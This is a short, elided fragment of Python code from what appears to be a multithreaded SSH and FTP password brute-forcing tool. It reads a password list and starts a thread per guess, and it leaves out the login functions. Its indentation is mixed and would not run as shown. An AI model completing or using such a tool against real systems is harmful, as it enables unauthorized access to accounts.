...
def main():
	with open(file,'r') as infile: # open password file
		for line in infile: # loop through each line
			...
			if option == '-ssh' or option == '-SSH': 
				t = threading.Thread(target=ssh_brute, args=(password,)) 
				t.start() 
				time.sleep(0.2) # wait .2 seconds

			elif option == '-ftp' or option == '-FTP':
				t = threading.Thread(target=ftp_brute, args=(password,)) 
                                t.start() 
                                time.sleep(0.2) 
